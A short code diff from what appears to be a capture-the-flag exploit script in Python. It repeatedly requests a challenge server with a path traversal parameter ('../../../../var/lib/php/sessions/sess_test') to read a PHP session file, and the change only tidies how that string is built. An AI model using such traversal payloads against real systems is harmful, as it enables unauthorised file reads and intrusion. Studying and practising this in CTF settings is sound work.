@@ -99,7 +99,7 @@ url = "http://apb2023.cstec.kr:8000"
 
 def session1():
     while True:
-        query = url + "/?page=../../../../" + "var/lib/php/sessions/sess_test"
+        query = url + "/?page=../../../../var/lib/php/sessions/sess_test"
         res = requests.get(query)
         if len(res.text) != 0:
             print(res.text)
